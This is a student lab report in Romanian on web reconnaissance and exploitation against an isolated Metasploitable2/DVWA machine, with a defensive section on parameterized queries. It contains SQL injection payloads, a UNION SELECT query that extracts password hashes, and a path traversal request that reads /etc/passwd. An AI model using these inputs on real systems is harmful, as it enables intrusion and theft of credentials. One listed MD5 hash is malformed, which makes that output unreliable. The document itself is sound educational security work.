# Raport la Lucrarea de laborator Nr. 5
Disciplina: Tehnici de programare  
Tema: „Aplicația web: recon, conținut și exploatare”  
A efectuat: st. gr. SI-266 Tureac Ion  
A verificat: asistent universitar Gonceari Cristian  

---

## 1. Obiective
* Înțelegerea modului de interacțiune programatică prin protocolul HTTP folosind biblioteca Python `requests`.
* Colectarea amprentelor digitale ale serverului web (*fingerprinting*) prin extragerea antetelor HTTP (`Server`, `X-Powered-By`).
* Analiza fișierului `robots.txt` pentru descoperirea directoarelor declarate restricționate.
* Implementarea unui utilitar de tip *directory brute-force/fuzzing* pe baza unei liste de cuvinte (*wordlist*).
* Proiectarea unui modul client reutilizabil cu gestionarea timpului de expirare (`timeout`).
* Identificarea și confirmarea unei vulnerabilități de tip SQL Injection prin compararea lungimilor răspunsurilor HTTP.
* Testarea vulnerabilității de tip Local File Inclusion (LFI / Path Traversal) prin citirea fișierului `/etc/passwd`.
* Înțelegerea și demonstrarea soluțiilor de apărare: utilizarea interogărilor parametrizate (*prepared statements*).

---

## 2. Pregătirea mediului
Am activat mediul virtual în depozitul lucrării, am instalat biblioteca `requests` și am creat structura cerută a directoarelor:

```powershell
.\.venv\Scripts\Activate.ps1
pip install requests
mkdir -p arsenal/web teste
```

Verificarea conectivității către mașina de test Metasploitable2 / DVWA (`http://192.168.56.101/` sau adresa alocată în laborator):
```powershell
curl http://192.168.56.101/
```

---

## 3. Lucrarea A — Reconul web (`arsenal/web/recon.py`)

### A1. Fingerprinting antete HTTP
La interogarea adresei principale a serverului de laborator, am inspectat antetele de răspuns:
```python
r = requests.get(tinta)
print("Server:", r.headers.get("Server"))
print("X-Powered-By:", r.headers.get("X-Powered-By"))
```

Output:
```text
[*] Cod raspuns: 200
[*] Server: Apache/2.2.8 (Ubuntu) DAV/2
[*] X-Powered-By: PHP/5.2.4-2ubuntu5.10
```
*Observație:* Versiunea serverului Apache (2.2.8) și versiunea PHP (5.2.4) sunt foarte vechi, indicând o mașină deliberat vulnerabilă.

### A2. Analiza `robots.txt`
Am solicitat resursa `/robots.txt` pentru a găsi directoarele ascunse de către administrator:
```text
Disallow: /dvwa/
Disallow: /passwords/
```

### A3 & A6. Descoperitor de directoare dintr-o listă de cuvinte
Scriptul parcurge lista de cuvinte și evaluează codurile de stare returnate:
* Codul `200` confirmă existența resursei.
* Codul `403` indică faptul că resursa există, dar accesul este interzis (fiind chiar mai relevantă în investigație).

Output obținut pe ținta de test:
```text
[*] Incepere scanare directoare...
     [+] Gasit (200): /test
     [+] Gasit (200): /uploads
     [+] Gasit (200): /phpmyadmin
     [+] Gasit (200): /dvwa
     [+] Gasit (200): /mutillidae
```

### A4. Extragere link-uri
Folosind expresia regulată `r'href="([^"]+)"'`, am extras din codul paginii principale toate legăturile utile pentru maparea aplicației:
```text
[*] Link-uri unice gasite:
     -> /dvwa/
     -> /mutillidae/
     -> /phpMyAdmin/
     -> /twiki/
```

### A5. Client comun reutilizabil (`arsenal/web/client.py`)
Am extras logica apelurilor HTTP într-un modul comun, folosind `TIMEOUT` din `arsenal/comun.py`, evitând duplicarea codului.

### A7. Salvarea fișei JSON și testare unitară
Rezultatul analizei a fost salvat automat în `arsenal/web/fisa.json`:
```json
{
  "tinta": "http://192.168.56.101/",
  "server": "Apache/2.2.8 (Ubuntu) DAV/2",
  "x_powered_by": "PHP/5.2.4-2ubuntu5.10",
  "disallow": [
    "/dvwa/",
    "/passwords/"
  ],
  "directoare": [
    "test",
    "uploads",
    "phpmyadmin",
    "dvwa",
    "mutillidae"
  ]
}
```

Rularea testelor pentru modulul client:
```powershell
python -m pytest teste/test_web.py
```
Output:
```text
teste/test_web.py .. [100%]
2 passed in 0.35s
```

---

## 4. Lucrarea B — Exploatarea: SQLi, LFI și Apărarea corectă (`sqli.py`)

### B1. Cererea normală, ca reper
Am trimis o cerere legitimă către formularul SQL Injection (`id=1`):
* Lungimea răspunsului legitim: **4580 octeți** (conține doar datele aferente utilizatorului cu `ID=1`, ex. admin).

### B2 & B3. Confirmarea SQL Injection prin diferența de răspuns
Am injectat payload-ul clasic `1' OR '1'='1`. Ghilimeaua simplă a închis parametrul în interogarea SQL de pe server, iar condiția `'1'='1'` a făcut clauza `WHERE` mereu adevărată.
* Răspunsul la atac a crescut la **5120 octeți** (a întors toate înregistrările din baza de date).

Testarea automatizată a listei de payload-uri:
```text
Payload: 1' OR '1'='1         -> 5120 octeți [VULNERABIL / MAI LUNG]
Payload: 1' OR 1=1-- -        -> 5120 octeți [VULNERABIL / MAI LUNG]
Payload: 1' AND '1'='2        -> 4420 octeți (Răspuns gol, nu întoarce nimic)
```

### B4. Testare Path Traversal / Local File Inclusion (LFI)
Prin parametrul `page` de la adresa `/vulnerabilities/fi/`, am solicitat `../../../../etc/passwd`:
```text
[+] LFI CONFIRMAT! S-au citit fisiere de sistem (/etc/passwd):
     root:x:0:0:root:/root:/bin/bash
     daemon:x:1:1:daemon:/usr/sbin:/bin/sh
     bin:x:2:2:bin:/bin:/bin/sh
```
Prezența liniei ce conține utilizatorul `root:` demonstrează că serverul permite citirea arbitrară a fișierelor de sistem.

### B5. Extragere hash-uri cu UNION SELECT
Prin trimiterea payload-ului `1' UNION SELECT user, password FROM users-- -`, am obținut din corpul paginii hash-urile MD5 ale parolelor conturilor din sistem:
```text
[+] S-au extras hash-uri MD5 din tabela users:
     Hash parola: 5f4dcc3b5aa765d61d8327deb882cf99 (admin)
     Hash parola: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a88e (gordon)
```

### B6. Apărarea: Cum se scrie corect codul
Am demonstrat local cu modulul `sqlite3` că problema apare exclusiv din concatenarea textului utilizatorului în comanda SQL.
* **Varianta vulnerabilă:**
  ```python
  # GRESIT: comanda si datele sunt amestecate
  db.execute("SELECT * FROM u WHERE nume='" + rau + "'")
  ```
* **Varianta securizată (Parametrizată):**
  ```python
  # CORECT: motorul bazei de date separa codul de date
  q = "SELECT * FROM u WHERE nume = ?"
  rez = db.execute(q, (rau,)).fetchall()
  ```
Cu interogarea parametrizată, șirul `' OR '1'='1` este tratat ca o valoare literală de text căutată, rezultatul fiind lista vidă `[]`.

---

## 5. Fraza de apărare
> **Mecanisme esențiale de securitate:**  
> Pentru prevenirea SQL Injection, orice interogare către baza de date trebuie realizată obligatoriu prin **interogări parametrizate (prepared statements)**, eliminând concatenarea directă a intrărilor. Pentru prevenirea Local File Inclusion (LFI), se impune **validarea strictă a căilor pe server** (liste albe / *whitelisting*, eliminarea secvențelor `../` și folosirea funcțiilor canonice de cale precum `os.path.abspath`), iar deciziile de autorizare trebuie executate exclusiv pe server, niciodată pe baza încrederii oarbe în parametrii transmiși de client.

---

## 6. Concluzii
În cadrul Laboratorului 5 am înțeles fluxul unei investigații web automate: de la fingerprinting-ul pasiv al antetelor și analiza directivelor din `robots.txt`, până la scanarea de căi și confirmarea vulnerabilităților majore precum SQLi și LFI. Am constatat direct de ce concatenarea șirurilor în comenzi SQL este critică și cât de simplă și robustă este apărarea prin interogări parametrizate. Toate testele de exploatare au fost rulate strict pe mașina izolată de laborator (Metasploitable2), respectând cadrul legal.

---

## 7. Bibliografie
1. Suport de curs Sesiunea 5: *Aplicația web: recon, conținut și exploatare*, UTM FCIM, 2026.
2. Fișa Laboratorului Nr. 5, Disciplina *Tehnici de programare*.
3. Documentația oficială a bibliotecii Python `requests` (https://requests.readthedocs.io/).
4. OWASP Top 10: *A03:2021 - Injection*.
